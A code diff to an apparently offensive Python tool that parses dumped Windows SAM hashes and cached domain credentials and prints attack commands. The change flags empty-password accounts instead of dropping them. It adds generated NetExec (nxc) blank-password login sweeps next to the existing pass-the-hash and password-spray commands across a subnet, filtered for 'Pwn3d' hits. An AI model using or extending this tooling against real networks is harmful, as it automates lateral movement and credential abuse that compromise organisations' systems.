@@ -55,12 +55,12 @@ def parse(text):
             else:                                   section = "other"
             continue
 
-        # ---- SAM local hashes:  user:rid:lm:nt:::
-        m = re.match(r'^([^:]+):(\d+):([0-9a-f]{32}):([0-9a-f]{32}):::', s, re.I)
+        # ---- SAM local hashes:  user:rid:lm:nt:::  (tolerant of trailing junk)
+        m = re.match(r'^([^:]+):(\d+):([0-9a-f]{32}):([0-9a-f]{32}):', s, re.I)
         if m:
             user, rid, lm, nt = m.groups()
-            if nt.lower() != EMPTY_NT:
-                out["local_hashes"].append((user, rid, nt))
+            empty = nt.lower() == EMPTY_NT
+            out["local_hashes"].append((user, rid, nt, empty))
             continue
 
         # ---- cached domain creds (DCC2)
@@ -143,11 +143,13 @@ def report(d, args):
 
     # ---- local hashes ----
     print()
-    P("LOCAL HASHES (SAM)  — PtH with --local-auth (empty-pw dropped)", "high")
+    P("LOCAL HASHES (SAM)  — PtH with --local-auth (empty-pw flagged, not dropped)", "high")
     if d["local_hashes"]:
-        for u, rid, nt in d["local_hashes"]:
-            star = "  ← RID 500, likely reused domain-wide" if rid == "500" else ""
-            print(f"   {u} (rid {rid}) : {nt}{col(star, C['crit'], on)}")
+        for u, rid, nt, empty in d["local_hashes"]:
+            tags = []
+            if rid == "500": tags.append(col("← RID 500, likely reused domain-wide", C['crit'], on))
+            if empty: tags.append(col("← EMPTY PASSWORD — log in with a blank pw!", C['crit'], on))
+            print(f"   {u} (rid {rid}) : {nt}  {'  '.join(tags)}")
     else:
         P("   none (all empty)", "dim")
 
@@ -190,7 +192,12 @@ def report(d, args):
             print(f"nxc winrm {dc} -u {su} -p '{p}' -d {dom}")
             print(f"nxc smb {sub} -u {su} -p '{p}' -d {dom} --continue-on-success | grep -E '\\[\\+\\]|Pwn3d'")
             print()
-        for u, rid, nt in d["local_hashes"]:
+        for u, rid, nt, empty in d["local_hashes"]:
+            if empty:
+                print(col(f"# {u} has an EMPTY password — try blank login:", C['dim'], on))
+                print(f"nxc smb {sub} -u {u} -p '' --local-auth --continue-on-success | grep -E '\\[\\+\\]|Pwn3d'")
+                print()
+                continue
             print(col(f"# {u} local hash — PtH sweep", C['dim'], on))
             print(f"nxc smb {sub} -u {u} -H {nt} --local-auth --continue-on-success | grep Pwn3d")
             print()
